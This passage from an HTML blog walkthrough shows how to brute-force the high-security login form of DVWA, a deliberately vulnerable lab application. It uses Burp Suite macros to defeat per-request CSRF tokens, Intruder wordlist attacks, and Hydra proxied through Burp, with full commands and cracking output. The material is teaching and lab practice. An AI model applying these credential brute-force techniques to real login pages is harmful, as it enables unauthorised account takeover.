&lt;/span&gt;&lt;span class="line"&gt;16:13:22 patator    INFO - Hits/Done/Skip/Fail/Size: 36/36/0/0/43527, Avg: &lt;span class="m"&gt;0&lt;/span&gt; r/s, Time: 0h 0m 50s
&lt;/span&gt;&lt;span class="line"&gt;16:13:22 patator    INFO - To resume execution, pass --resume 36
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Patator Attack" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-09.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="L.strong.Burp.Suite..strong."&gt;&lt;/a&gt;
&lt;h2&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Burp Suite has a proxy tool in-built. Even though it is primarily a commercial tool, there is a "free license" version. The free edition contains a limited amount of features and functions with various limits in place, one of which is a slower "intruder" attack speed.&lt;/p&gt;

&lt;p&gt;Burp is mainly a graphical UI, which makes it harder to demonstrate how to use it (mouse clicking vs copying/pasting commands). This section really could benefit from a video, rather than a screenshot gallery....&lt;/p&gt;

&lt;p&gt;The first section will quickly load in the valid request, which contains the &lt;code&gt;user_token&lt;/code&gt; field we need to automate in each request. The next part will create a macro to automatically extract and use the value. The last part will be the brute force attack itself.&lt;/p&gt;

&lt;a name="Configure.Burp"&gt;&lt;/a&gt;
&lt;h3&gt;Configure Burp&lt;/h3&gt;

&lt;p&gt;This is quick and simple. Get to the brute force login page and make a login attempt when hooked inside the proxy.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The first thing we need to-do is set up our web browser (Iceweasel/Firefox) to use Burp's proxy.

&lt;ul&gt;
&lt;li&gt;IP: &lt;code&gt;127.0.0.1&lt;/code&gt; (loopback by Burp's default), Port: &lt;code&gt;8080&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Using &lt;a href="https://getfoxyproxy.org/"&gt;FoxyProxy&lt;/a&gt; to switch profiles.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Configuring Burp" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-10.png" /&gt;&lt;/p&gt;

&lt;a name="Macro"&gt;&lt;/a&gt;
&lt;h3&gt;Macro&lt;/h3&gt;

&lt;p&gt;This stage will now detect, extract and act on the &lt;code&gt;user_token&lt;/code&gt; field.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Options&lt;/code&gt; -&gt; &lt;code&gt;Sessions&lt;/code&gt; -&gt; &lt;code&gt;Session Handling Rules&lt;/code&gt; -&gt; &lt;code&gt;Add&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Add" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-11.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Rule Description&lt;/code&gt;: &lt;code&gt;DVWA Brute High&lt;/code&gt; -&gt; &lt;code&gt;Rule Action&lt;/code&gt; -&gt; &lt;code&gt;Add&lt;/code&gt; -&gt; &lt;code&gt;Run a macro&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Rule" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-12.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Select macro&lt;/code&gt; -&gt; &lt;code&gt;Add&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Select" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-13.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Macro Recorder&lt;/code&gt; -&gt; Select: &lt;code&gt;GET /DVWA/vulnerabilities/brute/ HTTP/1.1&lt;/code&gt; -&gt; OK&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Recorder" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-14.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Macro description&lt;/code&gt;: &lt;code&gt;Get user_token&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;#1&lt;/code&gt; -&gt; &lt;code&gt;Configure item&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Item" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-15.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Custom parameters locations in response&lt;/code&gt; -&gt; &lt;code&gt;Add&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Parameters" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-16.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Parameter name&lt;/code&gt;: &lt;code&gt;user_token&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Start after expression&lt;/code&gt;: &lt;code&gt;user_token' value='&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;End at delimiter&lt;/code&gt;: &lt;code&gt;' /&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Ok&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Configure" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-17.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;Ok -&gt; Ok&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro done" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-18.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;Enable: &lt;code&gt;Tolerate URL mismatch when matching parameters (use for URL-agnostic CSRF tokens)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Ok&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Tolerate" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-20.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;Result&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Result" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-21.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Scope&lt;/code&gt; -&gt; &lt;code&gt;Tool Scope&lt;/code&gt; -&gt; Only select: &lt;code&gt;Intruder&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;URL Scope&lt;/code&gt; -&gt; &lt;code&gt;Use Suite scope [defined in Target tab]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Ok&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;em&gt;We will come back here if we choose to use Hydra later.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt="Macro Scope" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-22.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Target&lt;/code&gt; -&gt; &lt;code&gt;Site map&lt;/code&gt; -&gt; &lt;code&gt;192.168.1.44&lt;/code&gt; -&gt; Right click: &lt;code&gt;Add to scope&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Macro Target Map" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-23.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Intruder"&gt;&lt;/a&gt;
&lt;h3&gt;Intruder&lt;/h3&gt;

&lt;p&gt;This is the main brute force attack itself. Due to the free version of Burp, this will be "slow".&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;First thing, find the request we made back at the start, when we tried to login with the bad credentials.&lt;/li&gt;
&lt;li&gt;Right click -&gt; &lt;code&gt;Send to Intruder&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Attack" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-25.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Intruder&lt;/code&gt; (tab) -&gt; &lt;code&gt;2&lt;/code&gt; -&gt; &lt;code&gt;Positions&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Attack type: &lt;code&gt;Cluster bomb&lt;/code&gt;.

&lt;ul&gt;
&lt;li&gt;This supports multiple lists (based on the number of fields in scope. Defined by &lt;code&gt;§value§&lt;/code&gt;), going through each value one by one in the first wordlist, then when it reaches the end to move to the next value in the next list&lt;/li&gt;
&lt;li&gt;For more information about attack types: &lt;a href="https://portswigger.net/burp/help/intruder_positions.html"&gt;https://portswigger.net/burp/help/intruder_positions.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Clear §&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Highlight: &lt;code&gt;user&lt;/code&gt; -&gt; Press: &lt;code&gt;Add §&lt;/code&gt;

&lt;ul&gt;
&lt;li&gt;Result: &lt;code&gt;username=§admin§&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Highlight: &lt;code&gt;pass&lt;/code&gt; -&gt; Press: &lt;code&gt;Add §&lt;/code&gt;

&lt;ul&gt;
&lt;li&gt;Result: &lt;code&gt;password=pass&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Positions" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-26.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Intruder&lt;/code&gt; (tab) -&gt; &lt;code&gt;2&lt;/code&gt; -&gt; &lt;code&gt;Payloads&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Payload Sets -&gt; Payload Sets: &lt;code&gt;1&lt;/code&gt;. Payload type: &lt;code&gt;Simple list&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Payload Options [Simple list] -&gt; Load -&gt; &lt;code&gt;/usr/share/seclists/Usernames/top_shortlist.txt&lt;/code&gt; -&gt; Open&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Payloads" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-28.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;Payload Sets -&gt; Payload Sets: &lt;code&gt;2&lt;/code&gt;. Payload type: &lt;code&gt;Simple list&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Payload Set Simple List" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-29.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;Payload Options [Simple list] -&gt; Load -&gt; &lt;code&gt;/usr/share/seclists/Passwords/rockyou-10.txt&lt;/code&gt; -&gt; Open&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder wordlist" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-30.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;Total requests: &lt;code&gt;1,012&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Total requests" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-31.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Intruder&lt;/code&gt; (tab) -&gt; &lt;code&gt;2&lt;/code&gt; -&gt; &lt;code&gt;Options&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Attack Results -&gt; Untick: &lt;code&gt;Make unmodified baseline request&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Options" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-32.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;Grep - Extract -&gt; Add&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Grep" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-33.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Start after expression&lt;/code&gt;: &lt;code&gt;&amp;lt;pre&amp;gt;&amp;lt;br /&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;End at delimiter&lt;/code&gt;: &lt;code&gt;&amp;lt;/pre&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Ok&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Expressions" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-34.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Intruder (menu)&lt;/code&gt; -&gt; &lt;code&gt;Start attack&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Attack" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-35.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;This is the warning, informing us we are using the free edition of Burp, as a result, our attack speed will be limited.&lt;/li&gt;
&lt;li&gt;Ok&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Free Edition" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-36.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
&lt;li&gt;Result&lt;/li&gt;
&lt;li&gt;We can see the value which is successful by the &lt;code&gt;&amp;lt;pre&amp;gt;&amp;lt;br /&amp;gt;&lt;/code&gt; being different, as well as the &lt;code&gt;Length&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Intruder Result" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-37.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Hydra"&gt;&lt;/a&gt;
&lt;h2&gt;Hydra&lt;/h2&gt;

&lt;p&gt;This is not a complete section, as it expands upon the "Burp Proxy" above. We will be editing values which were created, rather than adding them.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hydra by itself is unable to perform the attack&lt;/strong&gt;. When putting Hydra's traffic through a proxy, &lt;strong&gt;the proxy can handle the request, altering Hydra's request so Hydra is not aware&lt;/strong&gt; of the CSRF tokens.&lt;/p&gt;

&lt;p&gt;In order to get Hydra to be able to brute force with CSRF tokens, we need to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;In Burp, &lt;strong&gt;edit the CSRF macro to run on traffic which is sent via the proxy&lt;/strong&gt; (see the Burp section above for the guide to create the macro).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Enable "invisible proxy" mode&lt;/strong&gt; inside of Burp, allowing Hydra to use Burp as a proxy (see &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level posting&lt;/a&gt; for why).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Create a rule to drop the unnecessary GET requests&lt;/strong&gt; Hydra creates (see &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;login screen posting&lt;/a&gt; for why).&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;CSRF Macro + Proxy&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Burp -&gt; Options -&gt; Sessions -&gt; Session Handling Rules -&gt; Edit: &lt;code&gt;DVWA Brute High&lt;/code&gt;

&lt;ul&gt;
&lt;li&gt;You will need see the Burp Suite section above, which shows how to create this.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scope -&gt; Tools Scope -&gt; Enable: &lt;code&gt;Proxy (use with cation)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Ok&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Hydra CSRF Macro + Proxy" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-38.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Enable Invisible Proxy Mode&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Burp -&gt; Proxy -&gt; Options&lt;/li&gt;
&lt;li&gt;Proxy Listeners -&gt; Edit: &lt;code&gt;127.0.0.1&lt;/code&gt; -&gt; Request handling -&gt; Tick: &lt;code&gt;Support invisible proxying (enable only if needed)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Hydra Invisible Proxy" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-39.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Drop unwanted GET requests&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Burp -&gt; Proxy -&gt; Options&lt;/li&gt;
&lt;li&gt;Match and Replace -&gt; Add

&lt;ul&gt;
&lt;li&gt;Type: &lt;code&gt;Request header&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Match: &lt;code&gt;GET /DVWA/vulnerabilities/brute/ HTTP/1.0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Replace: &amp;lt; BLANK &gt;&lt;/li&gt;
&lt;li&gt;Comment: &lt;code&gt;DVWA Hydra Brute High&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Enable: Regex match &lt;em&gt;(Even if we did not use any expression. Oops!)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ok&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Hydra Drop GET requests" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-40.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie &amp;quot;192.168.1.44/DVWA/login.php&amp;quot; | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;192.168.1.44/DVWA/login.php&amp;quot; &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# rm -f hydra.restore; export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# hydra  -l admin -P /usr/share/seclists/Passwords/rockyou.txt \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -e ns  -F  -u  -t &lt;span class="m"&gt;1&lt;/span&gt;  -w &lt;span class="m"&gt;5&lt;/span&gt;  -v  -V  192.168.1.44  http-get-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=123&amp;amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\: security=high; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-11-06 23:24:29
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Using HTTP Proxy: http://127.0.0.1:8080
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;1&lt;/span&gt; task per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;14344400&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:14344400&lt;span class="o"&gt;)&lt;/span&gt;, ~224131 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-get-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;VERBOSE&lt;span class="o"&gt;]&lt;/span&gt; Resolving addresses ... &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;2&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;123456&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;3&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;12345&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;4&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;123456789&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;5&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.44 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;6&lt;/span&gt; of &lt;span class="m"&gt;14344400&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: admin   password: password
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; attack finished &lt;span class="k"&gt;for&lt;/span&gt; 192.168.1.44 &lt;span class="o"&gt;(&lt;/span&gt;valid pair found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;1&lt;/span&gt; valid password found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-11-06 23:24:42
